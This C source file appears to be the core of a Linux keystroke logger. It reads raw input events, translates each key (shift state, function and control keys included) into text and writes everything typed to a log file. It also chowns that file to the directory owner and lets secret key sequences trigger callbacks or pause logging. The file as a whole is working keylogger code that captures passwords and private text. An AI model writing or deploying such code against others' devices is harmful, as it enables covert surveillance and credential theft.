#include <errno.h>
#include <fcntl.h>      /* for open */
#include <stdbool.h>    /* for bool */
#include <stdio.h>      /* for snprintf */
#include <stdlib.h>     /* for malloc */
#include <string.h>     /* for strerror */
#include <sys/stat.h>   /* for mode */
#include <unistd.h>     /* for getcwd */

#include "common.h"
#include "keylog.h"
#include "logger.h"

#define MAX_KEY_SEQ 5

enum ev_value {
    RELEASED,
    PRESSED,
    REPEATED,
};

struct priv {
    keyseq_t seq_list[MAX_KEY_SEQ]; /* hard code for now */
    int num_seq;

    struct {
        int fd; /* file descriptor */
        mode_t mode;
        char path[LOG_PATH_LEN];
        int flags;
        char backspace;
    } log;
};

static int keylog_open(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    int oflag;
    char path[LOG_PATH_LEN];
    struct stat stat_cwd;

    /* open for writing only, create file if doesn't exist */
    oflag = (O_WRONLY | O_CREAT);

    if (priv->log.flags & KEY_LOG_FLAG_APPEND) {
        oflag |= O_APPEND;
    } else {
        /* Truncate the file to 0 */
        oflag |= O_TRUNC;
    }

    getcwd(path, LOG_PATH_LEN);

    /* collect information about the current directory */
    stat(path, &stat_cwd);

    strncpy(path, priv->log.path, LOG_PATH_LEN);

    logger.info("Log file: %s", path);

    priv->log.fd = open(path, oflag, O_WRONLY);

    /* Set the owner to match that of the directory that it's run under */
    fchown(priv->log.fd, stat_cwd.st_uid, stat_cwd.st_gid);
    fchmod(priv->log.fd, priv->log.mode);

    return OK;
}

static int keylog_close(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (close(priv->log.fd) == ERROR) {
        logger.warn("Closing %s failed: %s",
                     priv->log.path, strerror(errno));
        return ERROR;
    }

    return OK;
}

static bool has_seq_triggered(unsigned short ev_code,
                              keyseq_t *seq)
{
    bool seq_triggered = false;

    if (ev_code == (unsigned short) seq->keys->el[seq->index]) {
        seq->index++;

        if (seq->index == seq->keys->size) {
            seq->index = 0;
            seq_triggered = true;
        }
    } else {
        seq->index = 0;
    }

    return seq_triggered;
}

/*
 * Structure definition:
 *
 * struct input_event {
 *    struct timeval time;
 *    unsigned short type;
 *    unsigned short code;
 *    unsigned int value;
 * }
 */
#define BUFLEN 12

static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (!kl->logging_enabled) {
        return;
    }

    char strbuf[BUFLEN] = { '\0' };
    char lc = '\0';
    char uc = '\0';

    unsigned short code = e.code;

    switch (code) {
    case KEY_0: lc = '0'; uc = ')'; break;
    case KEY_1: lc = '1'; uc = '!'; break;
    case KEY_2: lc = '2'; uc = '@'; break;
    case KEY_3: lc = '3'; uc = '#'; break;
    case KEY_4: lc = '4'; uc = '$'; break;
    case KEY_5: lc = '5'; uc = '%'; break;
    case KEY_6: lc = '6'; uc = '^'; break;
    case KEY_7: lc = '7'; uc = '&'; break;
    case KEY_8: lc = '8'; uc = '*'; break;
    case KEY_9: lc = '9'; uc = '('; break;

    case KEY_A: lc = 'a'; uc = 'A'; break;
    case KEY_B: lc = 'b'; uc = 'B'; break;
    case KEY_C: lc = 'c'; uc = 'C'; break;
    case KEY_D: lc = 'd'; uc = 'D'; break;
    case KEY_E: lc = 'e'; uc = 'E'; break;
    case KEY_F: lc = 'f'; uc = 'F'; break;
    case KEY_G: lc = 'g'; uc = 'G'; break;
    case KEY_H: lc = 'h'; uc = 'H'; break;
    case KEY_I: lc = 'i'; uc = 'I'; break;
    case KEY_J: lc = 'j'; uc = 'J'; break;
    case KEY_K: lc = 'k'; uc = 'K'; break;
    case KEY_L: lc = 'l'; uc = 'L'; break;
    case KEY_M: lc = 'm'; uc = 'M'; break;
    case KEY_N: lc = 'n'; uc = 'N'; break;
    case KEY_O: lc = 'o'; uc = 'O'; break;
    case KEY_P: lc = 'p'; uc = 'P'; break;
    case KEY_Q: lc = 'q'; uc = 'Q'; break;
    case KEY_R: lc = 'r'; uc = 'R'; break;
    case KEY_S: lc = 's'; uc = 'S'; break;
    case KEY_T: lc = 't'; uc = 'T'; break;
    case KEY_U: lc = 'u'; uc = 'U'; break;
    case KEY_V: lc = 'v'; uc = 'V'; break;
    case KEY_W: lc = 'w'; uc = 'W'; break;
    case KEY_X: lc = 'x'; uc = 'X'; break;
    case KEY_Y: lc = 'y'; uc = 'Y'; break;
    case KEY_Z: lc = 'z'; uc = 'Z'; break;

    case KEY_COMMA: lc = ','; uc = '<'; break;
    case KEY_SEMICOLON: lc = ';'; uc = ':'; break;
    case KEY_APOSTROPHE: lc = '\''; uc = '"'; break;
    case KEY_DOT: lc = '.'; uc = '>'; break;
    case KEY_SLASH: lc = '/'; uc = '?'; break;
    case KEY_BACKSLASH: lc = '\\'; uc = '|'; break;

    case KEY_BACKSPACE:
        lc = uc = priv->log.backspace;
        break;

    case KEY_MINUS: lc = '-'; uc = '_'; break;
    case KEY_EQUAL: lc = '='; uc = '+'; break;
    case KEY_GRAVE: lc = '`'; uc = '~'; break;

    case KEY_ENTER: lc = uc = '\n'; break;
    case KEY_TAB: lc = uc = '\t'; break;
    case KEY_SPACE: lc = uc = ' '; break;

    /* Keypad */
    case KEY_KP0: lc = uc = '0'; break;
    case KEY_KP1: lc = uc = '1'; break;
    case KEY_KP2: lc = uc = '2'; break;
    case KEY_KP3: lc = uc = '3'; break;
    case KEY_KP4: lc = uc = '4'; break;
    case KEY_KP5: lc = uc = '5'; break;
    case KEY_KP6: lc = uc = '6'; break;
    case KEY_KP7: lc = uc = '7'; break;
    case KEY_KP8: lc = uc = '8'; break;
    case KEY_KP9: lc = uc = '9'; break;

    case KEY_KPMINUS: lc = uc = '-'; break;
    case KEY_KPPLUS: lc = uc = '+'; break;
    case KEY_KPDOT: lc = uc = '.'; break;

    /* Invisible */

    case KEY_ESC: strncpy(strbuf, "<ESC>", BUFLEN); break;

    case KEY_F1: strncpy(strbuf, "<F1>", BUFLEN); break;
    case KEY_F2: strncpy(strbuf, "<F2>", BUFLEN); break;
    case KEY_F3: strncpy(strbuf, "<F3>", BUFLEN); break;
    case KEY_F4: strncpy(strbuf, "<F4>", BUFLEN); break;
    case KEY_F5: strncpy(strbuf, "<F5>", BUFLEN); break;
    case KEY_F6: strncpy(strbuf, "<F6>", BUFLEN); break;
    case KEY_F7: strncpy(strbuf, "<F7>", BUFLEN); break;
    case KEY_F8: strncpy(strbuf, "<F8>", BUFLEN); break;
    case KEY_F9: strncpy(strbuf, "<F9>", BUFLEN); break;
    case KEY_F10: strncpy(strbuf, "<F10>", BUFLEN); break;
    case KEY_F11: strncpy(strbuf, "<F11>", BUFLEN); break;
    case KEY_F12: strncpy(strbuf, "<F12>", BUFLEN); break;

    case KEY_CAPSLOCK: strncpy(strbuf, "<CAPSLOCK>", BUFLEN); break;
    case KEY_NUMLOCK: strncpy(strbuf, "<NUMLOCK>", BUFLEN); break;
    case KEY_SCROLLLOCK: strncpy(strbuf, "<SCROLLLOCK>", BUFLEN); break;
    case KEY_RIGHTCTRL: strncpy(strbuf, "<R-CTRL>", BUFLEN); break;
    case KEY_RIGHTALT: strncpy(strbuf, "<R-ALT>", BUFLEN); break;
    case KEY_LEFTCTRL: strncpy(strbuf, "<L-CTRL>", BUFLEN); break;
    case KEY_LEFTALT: strncpy(strbuf, "<L-ALT>", BUFLEN); break;
    case KEY_LEFTMETA: strncpy(strbuf, "<L-META>", BUFLEN); break;
    case KEY_RIGHTMETA: strncpy(strbuf, "<R-META>", BUFLEN); break;

    case KEY_HOME: strncpy(strbuf, "<HOME>", BUFLEN); break;
    case KEY_END: strncpy(strbuf, "<END>", BUFLEN); break;
    case KEY_PAGEUP: strncpy(strbuf, "<PAGEUP>", BUFLEN); break;
    case KEY_PAGEDOWN: strncpy(strbuf, "<PAGEDOWN>", BUFLEN); break;

    case KEY_INSERT: strncpy(strbuf, "<INSERT>", BUFLEN); break;
    case KEY_DELETE: strncpy(strbuf, "<DELETE>", BUFLEN); break;

    case KEY_UP: strncpy(strbuf, "<UP>", BUFLEN); break;
    case KEY_LEFT: strncpy(strbuf, "<LEFT>", BUFLEN); break;
    case KEY_DOWN: strncpy(strbuf, "<DOWN>", BUFLEN); break;
    case KEY_RIGHT: strncpy(strbuf, "<RIGHT>", BUFLEN); break;


    default: lc = uc = '\0'; break;
    }

    char c = (is_upper) ? uc : lc;
    size_t len = strlen(strbuf);

    if (len) {
        write(priv->log.fd, strbuf, len);
    } else {
        write(priv->log.fd, &c, 1);
    }
}

static void keylog_process_event(keylog_t *kl, struct input_event e)
{
    struct priv *priv = (struct priv *) kl->priv;
    static bool is_upper;

    if (e.type != EV_KEY) {
        return;
    }

    if (e.code == KEY_LEFTSHIFT || e.code == KEY_RIGHTSHIFT) {
        if (e.value == REPEATED || e.value == PRESSED) {
            is_upper = true;
        } else {
            is_upper = false;
        }
    }

    if (e.value == RELEASED) {
        keylog_log(kl, e, is_upper);

        for (int k = 0; k < priv->num_seq; k++) {
            if (has_seq_triggered(e.code, &priv->seq_list[k])) {
                priv->seq_list[k].callback(kl);
            }
        }
    }
}

static void keylog_install_seq(keylog_t *kl, keyseq_t seq)
{
    struct priv *priv = (struct priv *) kl->priv;

    /* @todo Insert assert logic to protect against blowing past seq_list */

    priv->seq_list[priv->num_seq++] = seq;
}

static void keylog_pause(keylog_t *kl)
{
    kl->logging_enabled = false;
}

static void keylog_resume(keylog_t *kl)
{
    kl->logging_enabled = true;
}

keylog_t *create_keylog(const cmd_args_t cmd_args)
{
    keylog_t *kl;
    struct priv *priv;

    kl = (keylog_t *) malloc(sizeof(keylog_t));
    priv = (struct priv *) malloc(sizeof(struct priv));

    kl->open = keylog_open;
    kl->close = keylog_close;
    kl->process_event = keylog_process_event;
    kl->install_seq = keylog_install_seq;

    kl->pause = keylog_pause;
    kl->resume = keylog_resume;

    priv->log.flags = cmd_args.keylog.flags;
    priv->log.backspace = cmd_args.keylog.backspace;
    priv->log.mode = cmd_args.keylog.mode;
    strncpy(priv->log.path, cmd_args.keylog.path, LOG_PATH_LEN);

    priv->num_seq = 0;

    kl->logging_enabled = true;

    kl->priv = (void *) priv;

    return kl;
}

void destroy_keylog(keylog_t *kl)
{
    free(kl);
}
